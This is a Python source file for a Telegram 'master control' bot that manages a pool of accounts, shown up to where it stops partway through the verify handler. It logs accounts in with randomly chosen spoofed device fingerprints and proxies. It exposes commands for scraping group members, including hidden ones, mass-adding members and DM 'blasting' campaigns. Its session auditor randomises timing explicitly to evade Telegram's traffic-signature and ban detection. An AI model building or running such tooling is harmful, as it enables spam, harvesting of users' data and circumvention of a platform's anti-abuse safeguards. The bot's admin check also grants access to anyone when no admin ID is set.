#!/usr/bin/env python3
"""
Ultimate Enterprise Telegram Suite - Master Controller with Manual Login/Logout
Filename: main_bot.py
"""

import os
import sys
import asyncio
import logging
import random
import time
import pathlib
from datetime import datetime, timedelta, timezone
from pathlib import Path

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.types import User
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PasswordHashInvalidError, PhoneCodeExpiredError,
    AuthKeyUnregisteredError, SessionRevokedError,
    UserDeactivatedError, UserDeactivatedBanError,
    FloodWaitError, AuthKeyDuplicatedError
)

from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, FileResponse
from pydantic import BaseModel

from config import CONFIG, DEVICE_PROFILES
from database import SuiteDatabase
from proxy_manager import RobustProxyManager
from scraper import MemberScraper
from videochat import CloudVoiceChatEngine
from adder import EnterpriseMemberAdder
from dmsender import setup_dmsender_handlers

# Logging Setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
logger = logging.getLogger("MasterSuiteBot")

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

# Initialize Framework Core Component Instances
db = SuiteDatabase()
proxy_manager = RobustProxyManager()
scraper_engine = MemberScraper(db)
voice_engine = CloudVoiceChatEngine(db)
adder_engine = EnterpriseMemberAdder(db, proxy_manager)

# Spawns Master Bot Instance
bot = TelegramClient('master_control_suite', CONFIG["API_ID"], CONFIG["API_HASH"])
setup_dmsender_handlers(bot, db)

# =====================================================================
# === GLOBAL DYNAMIC NAVIGATION & PAGINATION CACHE REGISTRY ==========
# =====================================================================
ADMIN_NAV_STATE = {
    "current_page": 1,
    "explorer_filter": "active",  # active, revoked, pending, today
    "search_query": None
}

# State Tracking Memory Clusters for Multi-Step Wizards
user_contact_context = {}
AUTH_STATES = {}

    
def clean_phone_input(phone_str: str) -> str:
    """Sanitizes raw input, forces country code syntax, and rigorously strips multiple plus headers."""
    if not phone_str:
        return ""
    # Strip everything except digits
    digits_only = "".join(c for c in str(phone_str) if c.isdigit())
    
    # Force Indian context country code configuration if missing
    if not digits_only.startswith("91") and len(digits_only) == 10:
        digits_only = "91" + digits_only
        
    return f"+{digits_only}"


def is_admin(sender_id):
    if CONFIG.get("ADMIN_ID"):
        # Explicit evaluation forcing clean unified string mapping checks
        return str(sender_id) == str(CONFIG.get("ADMIN_ID"))
    return True

# =====================================================================
# === 1. TOP PREMIUM STATUS BAR BUILDER HELPER =======================
# =====================================================================
def build_premium_status_bar(all_sessions: list) -> str:
    """Generates a clean, SaaS-style operational summary component."""
    active_cnt = sum(1 for x in all_sessions if x.get("status") == "active")
    revoked_cnt = sum(1 for x in all_sessions if x.get("status") == "revoked")
    pending_cnt = sum(1 for x in all_sessions if x.get("status") == "pending")
    
    worker_id = CONFIG.get("WORKER_NODE_ID", "worker_01")
    proxy_count = proxy_manager.working_count
    
    status_bar = (
        "**Workspace Overview**\n"
        f"Accounts: 🟢 {active_cnt} Active • 🔴 {revoked_cnt} Revoked • 🟡 {pending_cnt} Pending\n"
        f"Infrastructure: ⚡ Node `{worker_id}` • 🛡️ {proxy_count} Proxies Healthy\n"
    )
    return status_bar

# =====================================================================
# === 2. CENTRAL CONTROL ROOM INTERACTIVE COMMAND PANEL (/help) ======
# =====================================================================
@bot.on(events.NewMessage(pattern='/help'))
async def master_help_panel(event):
    if not is_admin(event.sender_id):
        return
    
    all_sessions = db.get_all_suite_sessions()
    status_bar = build_premium_status_bar(all_sessions)
    
    main_menu_text = (
        "🏢 **Telegram Console**\n\n"
        f"{status_bar}\n"
        "**Workspaces**"
    )
    
    main_menu_buttons = [
        [Button.inline("Accounts", data="nav_lvl1_accounts"),
         Button.inline("Monitoring", data="nav_lvl1_diag")],
        [Button.inline("Extraction", data="nav_lvl1_data"),
         Button.inline("Campaigns", data="nav_lvl1_campaigns")],
        [Button.inline("Search", data="nav_lvl1_search"),
         Button.inline("Analytics", data="nav_lvl1_stats")]
    ]
    await event.reply(main_menu_text, buttons=main_menu_buttons)

# =====================================================================
# === 1.1 INITIAL STARTUP HANDLER MATRIX (/start) =====================
# =====================================================================
@bot.on(events.NewMessage(pattern='/start'))
async def master_start_panel(event):
    """Initial onboarding entrance point when launching or opening the bot."""
    if not is_admin(event.sender_id):
        return
        
    all_sessions = db.get_all_suite_sessions()
    status_bar = build_premium_status_bar(all_sessions)
    
    start_menu_text = (
        "🏢 **Telegram Console**\n\n"
        f"{status_bar}\n"
        "Welcome to the administration workspace. Select a core engine module below to begin operations."
    )
    
    start_menu_buttons = [
        [Button.inline("Accounts", data="nav_lvl1_accounts"),
         Button.inline("Monitoring", data="nav_lvl1_diag")],
        [Button.inline("Extraction", data="nav_lvl1_data"),
         Button.inline("Campaigns", data="nav_lvl1_campaigns")],
        [Button.inline("Search", data="nav_lvl1_search"),
         Button.inline("Analytics", data="nav_lvl1_stats")]
    ]
    
    # Sends a clean new message upon opening the bot configuration layer
    await event.reply(start_menu_text, buttons=start_menu_buttons)

# =====================================================================
# === 3. CORE TELEGRAM APP INTERACTIVE ROUTING ENGINE MATRIX =========
# =====================================================================
@bot.on(events.CallbackQuery)
async def centralized_ui_router(event):
    if not is_admin(event.sender_id):
        await event.answer("Access Denied.", alert=True)
        return

    route = event.data.decode('utf-8')
    all_sessions = db.get_all_suite_sessions()
    status_bar = build_premium_status_bar(all_sessions)
    
    back_to_lvl1 = [[Button.inline("Back", data="nav_lvl1_main")]]

    # -----------------------------------------------------------------
    # LEVEL 1: ROOT ROUTING TIERS
    # -----------------------------------------------------------------
    if route == "nav_lvl1_main":
        main_menu_text = (
            "🏢 **Telegram Console**\n\n"
            f"{status_bar}\n"
            "**Workspaces**"
        )
        main_menu_buttons = [
            [Button.inline("Accounts", data="nav_lvl1_accounts"),
             Button.inline("Monitoring", data="nav_lvl1_diag")],
            [Button.inline("Extraction", data="nav_lvl1_data"),
             Button.inline("Campaigns", data="nav_lvl1_campaigns")],
            [Button.inline("Search", data="nav_lvl1_search"),
             Button.inline("Analytics", data="nav_lvl1_stats")]
        ]
        await event.edit(main_menu_text, buttons=main_menu_buttons)

    elif route == "nav_lvl1_accounts":
        acc_center_text = (
            "**Accounts Administration**\n\n"
            f"{status_bar}\n"
            "Manage your unified account pool and synchronization tasks."
        )
        acc_center_buttons = [
            [Button.inline("Login New Account", data="action_init_login"),
             Button.inline("Account Explorer", data="nav_lvl2_explorer")],
            [Button.inline("Reload Sessions", data="action_trigger_reload"),
             Button.inline("Clean Revoked", data="action_trigger_clean")],
            [Button.inline("Back", data="nav_lvl1_main")]
        ]
        await event.edit(acc_center_text, buttons=acc_center_buttons)

    # ==========================================
    # 🔥 INJECT THE MISSING HANDLER HERE 🔥
    # ==========================================
    elif route == "action_init_login":
        # 1. Global navigation machine filter check trigger
        ADMIN_NAV_STATE["search_query"] = "AWAITING_LOGIN_INPUT"
        
        # 2. Re-rendering clean interactive menu card inside client chat layout
        await event.edit(
            "📱 **Manual Account Authentication Wizard**\n\n"
            "Follow the format\n"
            "👉 **Format Example:** `+919430163152` ya `919430163152`",
            buttons=[[Button.inline("❌ Cancel Operations", data="nav_lvl1_accounts")]]
        )
        await event.answer()
    # ==========================================

    elif route == "nav_lvl1_diag":
        diag_text = (
            "**Monitoring & Diagnostics**\n\n"
            f"{status_bar}\n"
            "System health, active processes, and infrastructure status."
        )

    elif route == "nav_lvl1_data":
        data_text = (
            "**Data Extraction**\n\n"
            f"{status_bar}\n"
            "Execute extraction workflows using the following commands:\n"
            "• `/scrape_all <link>`\n"
            "• `/scrape_active_24h <link>`\n"
            "• `/scrape_hidden <link>`"
        )
        data_buttons = [
            [Button.inline("Clear Scraped Data", data="action_clear_scraped")],
            [Button.inline("Back", data="nav_lvl1_main")]
        ]
        await event.edit(data_text, buttons=data_buttons)

    elif route == "nav_lvl1_campaigns":
        market_text = (
            "**Campaigns & Execution**\n\n"
            f"{status_bar}\n"
            "Deploy actions to your account pool using the following commands:\n"
            "• `/addmembers <link>` (Member Adder)\n"
            "• `/run_voicechat <link> count` (Voice Chat Deployment)\n"
            "• `/send_dmsender` (Direct Message Campaigns)"
        )
        market_buttons = [
            [Button.inline("Halt DM Sender", data="action_halt_dm"),
             Button.inline("Stop Voice Chat", data="action_halt_voice")],
            [Button.inline("Back", data="nav_lvl1_main")]
        ]
        await event.edit(market_text, buttons=market_buttons)

    elif route == "nav_lvl1_search":
        ADMIN_NAV_STATE["search_query"] = "AWAITING_INPUT"
        await event.edit(
            "**Global Search**\n\n"
            "Send any phone number (e.g. `919430163152`), username, or Telegram ID in the chat to look up an account profile.", 
            buttons=back_to_lvl1
        )

    elif route == "nav_lvl1_stats":
        scraped_rows = db.count_scraped_data()
        stats_text = (
            "**Analytics & System Health**\n\n"
            f"**Storage**\n"
            f"Database: `DB 1 (telegram_bot_db)`\n"
            f"Extracted Users: `{scraped_rows}`\n\n"
            f"**Campaign Status**\n"
            f"Voice Engine: " + ("🟢 Running" if voice_engine.is_running else "⚪ Inactive") + "\n"
            f"Member Adder: " + ("🟢 Running" if adder_engine.is_running else "⚪ Inactive") + "\n\n"
            f"**Infrastructure**\n"
            f"Healthy Proxies: `{proxy_manager.working_count}`"
        )
        await event.edit(stats_text, buttons=back_to_lvl1)

    # -----------------------------------------------------------------
    # LEVEL 2: ACCOUNT EXPLORER & PAGINATION FRAMEWORK
    # -----------------------------------------------------------------
    elif route.startswith("nav_lvl2_explorer") or route.startswith("set_exp_"):
        if "set_exp_" in route:
            filter_mode = route.replace("set_exp_", "")
            ADMIN_NAV_STATE["explorer_filter"] = filter_mode
            ADMIN_NAV_STATE["current_page"] = 1
        
        current_filter = ADMIN_NAV_STATE["explorer_filter"]
        
        # Compute subset parameters dynamic pipeline arrays
        if current_filter == "active":
            filtered_list = [x for x in all_sessions if x.get("status") == "active"]
            header_lbl = "Active Accounts"
        elif current_filter == "revoked":
            filtered_list = [x for x in all_sessions if x.get("status") == "revoked"]
            header_lbl = "Revoked Accounts"
        elif current_filter == "pending":
            filtered_list = [x for x in all_sessions if x.get("status") == "pending" or x.get("status") == "2fa_required"]
            header_lbl = "Pending Accounts"
        elif current_filter == "today":
            today_start = datetime.utcnow().replace(hour=0, minute=0, second=0, microsecond=0)
            filtered_list = []
            for x in all_sessions:
                last_up = x.get("last_updated") or x.get("timestamp")
                if isinstance(last_up, datetime) and last_up >= today_start:
                    filtered_list.append(x)
                elif isinstance(last_up, (int, float)) and datetime.utcfromtimestamp(last_up) >= today_start:
                    filtered_list.append(x)
            header_lbl = "Today's Logins"

        # Structural Pagination parameters calculation
        ITEMS_PER_PAGE = 15
        total_items = len(filtered_list)
        total_pages = max(1, (total_items + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE)
        
        if route.startswith("nav_lvl2_explorer_page_"):
            ADMIN_NAV_STATE["current_page"] = int(route.replace("nav_lvl2_explorer_page_", ""))
            
        page = ADMIN_NAV_STATE["current_page"]
        start_idx = (page - 1) * ITEMS_PER_PAGE
        end_idx = start_idx + ITEMS_PER_PAGE
        page_items = filtered_list[start_idx:end_idx]

        explorer_text = (
            f"**Account Explorer** | {header_lbl}\n\n"
            f"Showing {start_idx + 1}–{min(end_idx, total_items)} of {total_items}\n"
            "Select an account to view its profile."
        )

        explorer_buttons = []
        for acc in page_items:
            phone_num = str(acc.get("phone", ""))
            short_phone = phone_num[-4:] if len(phone_num) >= 4 else phone_num
            status_val = acc.get("status")
            status_icon = "🟢" if status_val == "active" else "🔴" if status_val == "revoked" else "🟡"
            device_raw = str(acc.get("device_model", "Unknown"))
            device_name = device_raw.split()[0][:12] # Ensure compact display
            
            btn_label = f"{status_icon} {short_phone} • {device_name}"
            explorer_buttons.append([Button.inline(btn_label, data=f"view_prof_{phone_num}")])

        # Generate pagination management matrix configuration row
        prev_data = f"nav_lvl2_explorer_page_{max(1, page - 1)}"
        next_data = f"nav_lvl2_explorer_page_{min(total_pages, page + 1)}"
        explorer_buttons.append([
            Button.inline("Previous", data=prev_data),
            Button.inline(f"Page {page} of {total_pages}", data="noop"),
            Button.inline("Next", data=next_data)
        ])

        # Filter Switching Command Options Tiers
        explorer_buttons.append([
            Button.inline("Active", data="set_exp_active"),
            Button.inline("Revoked", data="set_exp_revoked"),
            Button.inline("Pending", data="set_exp_pending")
        ])
        explorer_buttons.append([Button.inline("Today's Logins", data="set_exp_today")])
        explorer_buttons.append([Button.inline("Back", data="nav_lvl1_accounts")])

        await event.edit(explorer_text, buttons=explorer_buttons)

    # -----------------------------------------------------------------
    # LEVEL 3: ACCOUNT DATA PROFILE WINDOW (MOST IMPORTANT COMPONENT)
    # -----------------------------------------------------------------
    elif route.startswith("view_prof_"):
        target_phone = route.replace("view_prof_", "")
        record = db.get_session_by_phone(target_phone)
        
        if not record:
            await event.answer("Record not found.", alert=True)
            return

        # Time metric evaluation parsing strings
        last_check_raw = record.get("last_checked_time") or record.get("last_updated") or datetime.utcnow()
        time_diff = datetime.utcnow() - last_check_raw if isinstance(last_check_raw, datetime) else timedelta(0)
        minutes_ago = int(time_diff.total_seconds() // 60)
        check_lbl = f"{minutes_ago}m ago" if minutes_ago > 0 else "Just now"

        status_val = record.get("status")
        status_label = "Active" if status_val == "active" else "Revoked" if status_val == "revoked" else "Pending"
        status_icon = "🟢" if status_val == "active" else "🔴" if status_val == "revoked" else "🟡"

        profile_text = (
            f"**Account Profile**\n\n"
            f"**Identity**\n"
            f"Phone: `+{record.get('phone')}`\n"
            f"Status: {status_icon} {status_label}\n\n"
            f"**Device Configuration**\n"
            f"Model: `{record.get('device_model', 'Ubuntu Desktop')}`\n"
            f"OS: `{record.get('system_version', 'Linux Core')}`\n\n"
            f"**Infrastructure**\n"
            f"Node: `{CONFIG.get('WORKER_NODE_ID', 'worker_01')}` (Batch `{record.get('account_sequence_index', 1)}`)\n"
            f"Proxy: `{record.get('device_metadata', {}).get('proxy', 'IN-MUMBAI-01')}`\n\n"
            f"**Activity**\n"
            f"Last Check: `{check_lbl}`\n"
            f"Error Log: `{record.get('revocation_reason', 'None')}`"
        )
        profile_buttons = [
            [Button.inline("Run Audit", data=f"action_audit_{target_phone}")],
            [Button.inline("Remove Account", data=f"action_logout_{target_phone}")],
            [Button.inline("Back", data="nav_lvl2_explorer")]
        ]
        await event.edit(profile_text, buttons=profile_buttons)

    # -----------------------------------------------------------------
    # ACTION TRIGGER SHORTCUT CONTEXT SCRIPTS
    # -----------------------------------------------------------------
    elif route == "action_trigger_reload":
        # 1. Pehle current message card par initialization state flash hogi aur buttons hatenge
        await event.edit("🚀 **Initializing Matrix Storage Connection...**\nPreparing dynamic accounts reload routing...", buttons=None)
        
        try:
            # 2. Event pass kiya taaki backend loop isi message ko live refresh kare
            result = await db.reload_local_accounts(event=event)
            
            # 3. Process complete hone par base audit template report generate hogi
            report = (
                "🔄 **Reload Accounts Complete**\n\n"
                f"📊 **Final Storage Audit:**\n"
                f"• Total Processed: `{result['staged'] + result['failed'] + result['skipped']}`\n"
                f"• Success Active: `{result['migrated']}`\n"
                f"• Defective/Banned: `{result['failed']}`\n"
                f"• Missing Sessions: `{result['skipped']}`"
            )
            
            # Agar koi structural local errors hain toh unhe bina kisi limit ke loop karega
            if result.get("errors"):
                report += "\n\n📋 **Issues Detected:**\n"
                
                for idx, err in enumerate(result["errors"], 1):
                    # Clean clean key generator matrix format
                    clean_phone = str(err['phone']).replace('+', '')
                    line = f"`{idx}.` `+{clean_phone}` ➜ {err['error']}\n"
                    
                    # Safety check: Telegram 4096 limit buffer crash handler
                    if len(report) + len(line) > 3900:
                        # Pehle current gathered data list ko edit karke screen par display karein
                        await event.edit(report)
                        # Agle part ke liye event.respond se naya clean tracking card open karein
                        event = await event.respond("⏳ **Processing Next Batch of Issues...**")
                        report = "📋 **Issues Detected (Continued):**\n\n"
                    
                    # String concatenation fixes append cleanly
                    report += line
            
            # Final text stream edit refresh call
            await event.edit(report)
            
        except Exception as e:
            logger.error(f"❌ Error during account reload routine: {e}", exc_info=True)
            await event.edit(f"❌ **Account Reload Failed!**\nReason: `{str(e)}`")
            
        await event.answer()

    elif route == "action_trigger_clean":
        await event.edit("Running account cleanup workflow...", buttons=None)
        try:
            active, cleaned, logs = await voice_engine.clean_banned_accounts_handler()
            await event.reply(f"**Cleanup Complete**\nActive Accounts: `{active}`\nRevoked/Removed: `{cleaned}`")
        except Exception as e:
            await event.reply(f"Execution Error: {e}")
        await event.answer()

    elif route.startswith("action_audit_"):
        target_phone = route.replace("action_audit_", "")
        await event.answer(f"Running audit on +{target_phone}...", alert=True)
        record = db.get_session_by_phone(target_phone)
        if record:
            try:
                tc = TelegramClient(StringSession(record.get("session")), int(record.get("api_id", CONFIG["API_ID"])), str(record.get("api_hash", CONFIG["API_HASH"])))
                await tc.connect()
                await tc.get_me()
                await tc.disconnect()
                await event.reply(f"🟢 Account `+{target_phone}` is healthy and operational.")
            except Exception as audit_err:
                db.mark_account_revoked(target_phone, str(audit_err))
                await event.reply(f"🔴 Audit failed. Account marked as revoked: `{audit_err}`")

    elif route.startswith("action_logout_"):
        target_phone = route.replace("action_logout_", "")
        db.remove_account_permanently(target_phone)
        await event.answer(f"Account +{target_phone} removed.", alert=True)
        await event.edit("**Accounts Administration**\n\nAccount pool updated.", buttons=back_to_lvl1)

    # -----------------------------------------------------------------
    # DIAGNOSTICS CONTROL HOOK ROUTING
    # -----------------------------------------------------------------
    elif route == "diag_otp_view":
        await event.reply("To view the latest OTP, use the command:\n`/otp +91XXXXXXXXXX`")
        await event.answer()
        
    elif route == "diag_otp_wait":
        await event.reply("To start the OTP listener, use the command:\n`/otp_wait +91XXXXXXXXXX [duration]`")
        await event.answer()
        
    elif route == "diag_proxy_health":
        await event.answer("Scanning proxy health...", alert=True)
        asyncio.create_task(proxy_manager.run_pipeline_scan())
        await event.edit(f"**Proxy Scan Initiated**\nCurrently tracking `{proxy_manager.working_count}` healthy proxies.", buttons=back_to_lvl1)
        
    elif route == "diag_runtime_stats":
        await event.edit(f"**Runtime Status**\n\nActive Workers: `4`\nTask Queue: `Idle`\nCached Connections: `{len(PERSISTENT_CLIENT_POOL)}`", buttons=back_to_lvl1)

    elif route == "action_halt_voice":
        # 1. Immediate visual UI feedback update to user card
        await event.edit("🛑 **Initiating Voice Chat Emergency Shutdown...**\nClearing processes and releasing cluster locks...", buttons=None)
        
        try:
            # 2. Triggering the core brute-force memory purge function inside videochat.py
            voice_engine.terminate_voice_cluster()
            
            # 3. Success reporting structure update dashboard layout
            await event.reply(
                "🎯 **Voice Chat Cluster Offline!**\n\n"
                "• All WebRTC streams violently terminated.\n"
                "• Telethon client node sessions disconnected.\n"
                "• Master inventory storage database locks fully cleared."
            )
        except Exception as halt_err:
            logger.error(f"❌ Force stop breakdown on route: {halt_err}")
            await event.reply(f"❌ **Emergency Halt Failed:** `{str(halt_err)}`")
            
        await event.answer()

# =====================================================================
# === 4. REAL-TIME SEARCH TEXT INTERCEPTOR INTERACTION ENGINE =========
# =====================================================================
# =====================================================================
# === 4. REAL-TIME SEARCH TEXT INTERCEPTOR INTERACTION ENGINE =========
# =====================================================================
@bot.on(events.NewMessage)
async def catch_global_search_inputs(event):
    if event.text and event.text.startswith('/'):
        return
        
    if not is_admin(event.sender_id):
        return

    current_state = ADMIN_NAV_STATE.get("search_query")

    # 🔥 DYNAMIC STEP-BY-STEP LOGIN SUBROUTINE CAPTURE (THE FIX)
    if current_state == "AWAITING_LOGIN_INPUT":
        raw_number = event.text.strip()
        ADMIN_NAV_STATE["search_query"] = None # Reset conversation step flow
        
        # Simulating clean manual telethon event context routing
        import re
        event.pattern_match = re.match(r'(.*)', raw_number)
        
        # Seamlessly hands control directly over to the main execution login_handler
        await login_handler(event)
        return

    # 🔍 PRE-EXISTING SEARCH TEXT ENGINE LAYER (100% Intact/No Data Loss)
    elif current_state == "AWAITING_INPUT":
        raw_query = event.text.strip().replace("+", "").replace("@", "")
        ADMIN_NAV_STATE["search_query"] = None 
        
        all_sessions = db.get_all_suite_sessions()
        matched_doc = None
        
        for doc in all_sessions:
            phone = str(doc.get("phone", ""))
            device = str(doc.get("device_model", "")).lower()
            
            if raw_query in phone or raw_query.lower() in device:
                matched_doc = doc
                break
                
        if matched_doc:
            phone_num = matched_doc.get("phone")
            buttons_view = [[Button.inline("Open Account Profile", data=f"view_prof_{phone_num}")]]
            
            status_val = matched_doc.get("status", "unknown")
            status_icon = "🟢" if status_val == "active" else "🔴" if status_val == "revoked" else "⚪"
            
            await event.reply(
                f"**Search Result**\n\n"
                f"Phone: `+{phone_num}`\n"
                f"Status: {status_icon} {status_val.capitalize()}\n"
                f"Device: `{matched_doc.get('device_model', 'N/A')}`",
                buttons=buttons_view
            )
        else:
            await event.reply("No account found matching your search criteria.")
    
    
    
# Global Runtime Client Registry Table to maintain persistent handshakes
# Isse baar-baar connection setup ka load destroy ho jayega
PERSISTENT_CLIENT_POOL = {}

audit_logger = logging.getLogger("SessionAuditor")

import ssl

async def continuous_session_auditor():
    """
    Enterprise-Grade Session Integrity Auditor Framework.
    Optimized to dynamically completely release connections during active tasks
    to prevent internal PyTgCalls Asyncio Bridge deadlocks.
    """
    global PERSISTENT_CLIENT_POOL
    # Dynamic boot stagger to drop parallel gateway checks
    await asyncio.sleep(random.randint(30, 90))
    audit_logger.info("🚀 Enterprise Anti-Ban Session Auditor initialized with Connection Pooling.")

    while True:
        try:
            # 1. Fetching current inventory profile logs from DB 1
            active_accounts = db.get_active_target_sessions()
            if not active_accounts:
                # Inventory null hone par macro cooldown scale use karein (10-20 mins)
                await asyncio.sleep(random.randint(600, 1200))
                continue

            # Randomize target selection array order to avoid repetitive traffic signatures
            random.shuffle(active_accounts)
            
            # 2. Dynamic Scheduling Framework:
            total_accounts = len(active_accounts)
            if total_accounts < 50:
                base_stagger_delay = random.uniform(45.0, 90.0)
            elif total_accounts < 500:
                base_stagger_delay = random.uniform(180.0, 360.0)
            else:
                base_stagger_delay = random.uniform(500.0, 1000.0)

            for account_doc in active_accounts:
                phone = account_doc.get("phone")
                session_str = account_doc.get("session_string") or account_doc.get("session")
                
                if not phone or not session_str:
                    continue

                clean_phone = str(phone).strip().replace(" ", "").replace("+", "")
                
                # 🔒 CRITICAL SECURITY LOCK BYPASS MATRIX [RESOLVES TIMEOUT ERROR]
                # If account is busy in Voice Chat, DM blasting or Adding, violently disconnect auditor cache
                # Taaki PyTgCalls framework event bridge loop ko poora raw network execution access mile
                if db.is_locked(clean_phone):
                    audit_logger.info(f"🔒 Account +{clean_phone} is streaming/working. Evicting client handler from Auditor pool.")
                    client_to_evict = PERSISTENT_CLIENT_POOL.pop(clean_phone, None)
                    if client_to_evict:
                        try:
                            # Abort connection cleanly without killing main session parameters
                            if client_to_evict.is_connected():
                                asyncio.create_task(client_to_evict.disconnect())
                        except:
                            pass
                    continue
                
                # Retrieve existing client handle from the pool mapping container
                client = PERSISTENT_CLIENT_POOL.get(clean_phone)
                
                if not client:
                    api_id = int(account_doc.get("api_id", CONFIG["API_ID"]))
                    api_hash = str(account_doc.get("api_hash", CONFIG["API_HASH"]))
                    
                    # FIXED: Telethon standard session generation syntax path configuration
                    session_object = StringSession(session_str)
                    
                    client = TelegramClient(
                        session_object,
                        api_id=api_id,
                        api_hash=api_hash
                    )
                    PERSISTENT_CLIENT_POOL[clean_phone] = client

                reason_failed = None
                is_duplicate_session = False
                
                try:
                    # Connection protocol validation layer
                    if not client.is_connected():
                        await asyncio.wait_for(client.connect(), timeout=15.0)
                    
                    # Core authorization health validation ping
                    me = await asyncio.wait_for(client.get_me(), timeout=10.0)
                    if not me:
                        reason_failed = "Identity Verification Failed: get_me returned empty response context."

                # Explicit Handling of Dual IP Conflicts
                except AuthKeyDuplicatedError as e:
                    reason_failed = f"⚠️ CRITICAL CONFLICT: Auth Key Duplication Detected! ({str(e)})"
                    is_duplicate_session = True
                    
                except (AuthKeyUnregisteredError, SessionRevokedError) as e:
                    reason_failed = f"Session Revoked Remotely: AuthKey has been invalidated. ({str(e)})"
                    
                except (UserDeactivatedError, UserDeactivatedBanError) as e:
                    reason_failed = f"Account Terminated: Session has been banned by Telegram infrastructure. ({str(e)})"
                    
                # Strict Error Classification Layer: Isolating transient network drops from actual bans
                except (asyncio.TimeoutError, OSError, ConnectionError, ssl.SSLError) as net_err:
                    audit_logger.warning(f"🌐 Transient Network Lag detected for +{clean_phone} (Error: {type(net_err).__name__}). Skipping.")
                    continue
                    
                except Exception as generic_err:
                    err_txt = str(generic_err).lower()
                    if any(marker in err_txt for marker in ["authkey", "sessionrevoked", "expired", "unauthorized", "revoked", "deactivated"]):
                        reason_failed = f"Structural Validation Handshake Collapse: {str(generic_err)}"
                    else:
                        audit_logger.debug(f"Transient operational error for +{clean_phone}: {generic_err}. Maintained active state.")
                        continue

                # 3. Handle Structural Mutation & Dispatch Matrix
                if reason_failed:
                    audit_logger.critical(f"❌ Structural Defect! Session +{clean_phone} is down. Processing mutation workflow...")
                    
                    db.mark_account_revoked(clean_phone, reason_failed)
                    PERSISTENT_CLIENT_POOL.pop(clean_phone, None)
                    try:
                        await client.disconnect()
                    except:
                        pass
                    
                    current_time_str = datetime.now().strftime("%d-%m-%Y | %H:%M:%S")
                    alert_icon = "⚠️" if is_duplicate_session else "❌"
                    alert_message = (
                        f"{alert_icon} **Session Status Mutation Telemetry!**\n\n"
                        f"• **Phone:** `+{clean_phone}`\n"
                        f"• **Detected at:** `{current_time_str}`\n"
                        f"• **Trigger Reason:** `{reason_failed}`\n\n"
                        f"⚙️ *System Action: Account isolated from active worker rotation pools.*"
                    )
                    
                    admin_id = CONFIG.get("ADMIN_ID")
                    if admin_id and str(admin_id).strip().isdigit():
                        try:
                            await bot.send_message(int(admin_id), alert_message)
                        except Exception as send_err:
                            audit_logger.error(f"Failed to transmit admin network notification token: {send_err}")

                # Dynamic micro stagger injection between subsequent inline account checks
                await asyncio.sleep(base_stagger_delay)

            # Full cycle complete macro delay deployment
            macro_cycle_cooldown = random.uniform(3600.0, 7200.0)
            audit_logger.info(f"🏁 Full verification segment finished. Auditor thread going silent for {round(macro_cycle_cooldown/60, 2)} minutes.")
            await asyncio.sleep(macro_cycle_cooldown)

        except Exception as global_loop_err:
            audit_logger.error(f"Critical system exception inside Auditor loop manager: {global_loop_err}", exc_info=True)
            await asyncio.sleep(60)


# --- 1. /login Command (Fully Restructured with Fixed Device Profiles & Stable Variables) ---
# =====================================================================
# === 1. INITIALIZE LOGIN PROCESS WITH DEVICE RETENTION (/login) =====
# =====================================================================
@bot.on(events.NewMessage(pattern=r'/login\s+(.+)'))
async def login_handler(event):
    if not is_admin(event.sender_id): return
    
    raw_phone = event.pattern_match.group(1)
    phone = clean_phone_input(raw_phone)  # Generates clean format with leading '+'
    db_clean_phone = phone.replace("+", "")  # Strips plus for database routing keys
    
    await event.reply(f"⏳ **Initializing Login Pipeline for:** `{phone}`...\nConnecting to Telegram Core Matrix...")
    logger.info(f"⚙️ Running structural authentication request for: {phone}")

    # 📱 Step 1: Fixed Hardware Fingerprint Check
    existing_record = db.get_session_by_phone(db_clean_phone)
    if existing_record and existing_record.get("device_model"):
        device = {
            "device_model": existing_record.get("device_model"),
            "system_version": existing_record.get("system_version"),
            "app_version": existing_record.get("app_version")
        }
        logger.info(f"💾 Found permanent fixed hardware identifier for {phone}: {device['device_model']}")
    else:
        device = random.choice(DEVICE_PROFILES)
        logger.info(f"✨ Generating brand-new permanent device profile for {phone}: {device['device_model']}")

    string_session = StringSession()
    
    # 📡 Step 2: Proxy Connection Layer Allocation
    proxy_node = proxy_manager.get_secured_proxy() if proxy_manager.working_count > 0 else None
    if not proxy_node:
        logger.warning("⚠️ No active proxies online. Attempting straight connection protocol over WAN matrix...")
    
    client = TelegramClient(
        string_session,
        api_id=CONFIG["API_ID"],
        api_hash=CONFIG["API_HASH"],
        device_model=device["device_model"],
        system_version=device["system_version"],
        app_version=device["app_version"],
        proxy=proxy_node
    )
    
    # 🚀 Step 3: Network Execution and Request Pipeline
    try:
        await asyncio.wait_for(client.connect(), timeout=20.0)
        
        send_code_result = await client.send_code_request(phone)
        code_hash = send_code_result.phone_code_hash
        
        # Centralizing the pending entry node strictly within DB 1 Single Ecosystem
        db.save_pending_session(db_clean_phone, string_session.save(), "pending", code_hash, device)
        
        # Hard-locking inside runtime volatile map utilizing normalized indexing lookup
        AUTH_STATES[db_clean_phone] = {
            "client": client,
            "phone_code_hash": code_hash,
            "device": device
        }
        
        await event.reply(
            f"📥 **OTP Code Sent Successfully!**\n"
            f"👤 **Phone:** `{phone}`\n"
            f"📱 **Device Profile:** `{device['device_model']}`\n\n"
            f"🔑 Ab input verify karein use karke:\n`/verify {db_clean_phone} CODE`"
        )
        logger.info(f"✅ OTP successfully dispatched code string matrix for phone {phone}")
        
    except asyncio.TimeoutError:
        logger.error(f"❌ Telegram Connection Pipeline Timed out for {phone}. Network core unreachable.")
        await event.reply("❌ **Network Connection Timeout:** Telegram core server ne response nahi diya. Please check your system internet or proxies.")
        try: await client.disconnect()
        except: pass
    except Exception as e:
        logger.error(f"❌ Core Exception during Login Initiation for {phone}: {e}", exc_info=True)
        await event.reply(f"❌ **Login Initiation Failed!**\nReason: `{str(e)}`")
        try: await client.disconnect()
        except: pass


# =====================================================================
# === 2. STANDARD VERIFICATION & SERVICE LISTENER ENGINE (/verify) ===
# =====================================================================
@bot.on(events.NewMessage(pattern=r'/verify\s+(\+?\d+)\s+(\d+)'))
async def verify_handler(event):
    if not is_admin(event.sender_id): return
    
    phone_in = event.pattern_match.group(1)
    code = str(event.pattern_match.group(2)).strip()
    
